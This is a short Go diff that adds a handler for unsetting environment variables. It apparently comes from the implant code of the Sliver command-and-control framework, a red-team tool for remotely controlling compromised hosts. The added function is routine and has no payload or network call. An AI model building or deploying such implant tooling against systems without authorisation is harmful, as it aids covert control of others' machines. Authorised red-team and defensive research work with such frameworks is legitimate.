@@ -448,6 +448,27 @@ func setEnvHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
+func unsetEnvHandler(data []byte, resp RPCResponse) {
+	unsetEnvReq := &sliverpb.UnsetEnvReq{}
+	err := proto.Unmarshal(data, unsetEnvReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v\n", err)
+		// {{end}}
+		return
+	}
+
+	err = os.Unsetenv(unsetEnvReq.Name)
+	unsetEnvResp := &sliverpb.UnsetEnv{
+		Response: &commonpb.Response{},
+	}
+	if err != nil {
+		unsetEnvResp.Response.Err = err.Error()
+	}
+	data, err = proto.Marshal(unsetEnvResp)
+	resp(data, err)
+}
+
 func reconnectIntervalHandler(data []byte, resp RPCResponse) {
 	reconnectIntervalReq := &sliverpb.ReconnectIntervalReq{}
 	err := proto.Unmarshal(data, reconnectIntervalReq)
